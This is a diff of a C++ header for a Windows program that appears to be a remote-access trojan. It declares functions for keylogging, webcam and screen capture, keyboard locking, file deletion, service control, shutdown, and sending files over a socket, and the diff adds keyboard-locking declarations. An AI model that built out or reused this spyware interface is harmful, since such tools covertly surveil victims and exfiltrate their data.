@@ -1,10 +1,10 @@
 #ifndef UTILS_H
 #define UTILS_H
 
-#include <map>
 #include <vector>
 #include <string>
 #include <thread>
+#include <chrono>
 #include <atomic>
 #include <fstream>
 #include <sstream>
@@ -12,6 +12,7 @@
 #include <iostream>
 #include <functional>
 #include <filesystem>
+#include <unordered_map>
 #include <afxsock.h>
 #include <windows.h>
 #include <tlhelp32.h>
@@ -24,14 +25,10 @@ using namespace cv;
 #define BUFFER_SIZE 2048
 #define SHUTDOWN_DELAY 15
 
-extern VideoCapture* cap;
-extern HHOOK hHook;
-extern atomic<bool> keepKeyloggerRunning;
-extern ofstream f;
 extern stringstream inp, out;
 extern string webcamCapturePath, keyloggerCapturePath, screenCapturePath, requestFilePath;
+extern map<string, map<string, function<void()>>> handlers;
 
-map<string, map<string, function<void()>>> setupHandlers();
 string getFileName(const string& filePath);
 void getInstruction();
 void listDir(const string& dirPath);
@@ -43,15 +40,16 @@ void startServiceByName(LPCWSTR serviceName);
 void stopServiceByName(LPCWSTR serviceName);
 void shutdownMachine();
 void restartMachine();
-void copyFile(LPCWSTR src, LPCWSTR dest);
-void deleteFile(LPCWSTR filePath);
-void captureScreen();
 void startKeylogger();
 void stopKeylogger();
 void startCamera();
-void captureCamera();
 void stopCamera();
+void captureCamera();
+void captureScreen();
+void lockKeyboard();
+void unlockKeyboard();
+void deleteFile(LPCWSTR filePath);
+void copyFile(LPCWSTR src, LPCWSTR dest);
 void sendFile(CSocket& socket, const string& filePath);
-void enableShutdownPrivilege();
 
 #endif
